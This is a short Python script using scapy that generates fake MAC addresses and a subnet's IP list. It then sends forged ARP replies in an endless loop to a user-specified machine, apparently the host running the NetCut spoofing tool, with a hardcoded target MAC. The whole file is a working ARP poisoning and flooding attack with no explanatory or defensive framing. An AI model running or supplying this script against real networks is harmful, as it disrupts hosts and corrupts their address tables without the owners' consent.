#!/usr/bin/python
from scapy.all import *
mymaclist=[]
listobj=[0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f']
for kittu in listobj:
   for manu in listobj:
      mymaclist.append('%s%s:22:33:aa:bb:%s%s' % (kittu,manu,kittu,manu))
netcut=raw_input("Enter the ip of the netcut running machine\n")
iplist=[]
ipoctet=raw_input("Enter the first three octet of you ip\n")
for ap in range(1,254):
   iplist.append(ipoctet+'.'+'%s' % ap)

while 1:
    for man in range(0,243):    
       arp=ARP(op=2,hwsrc=mymaclist[man],pdst=netcut,psrc=iplist[man],hwdst='d0:df:9a:cc:6b:9d')
       send(arp)
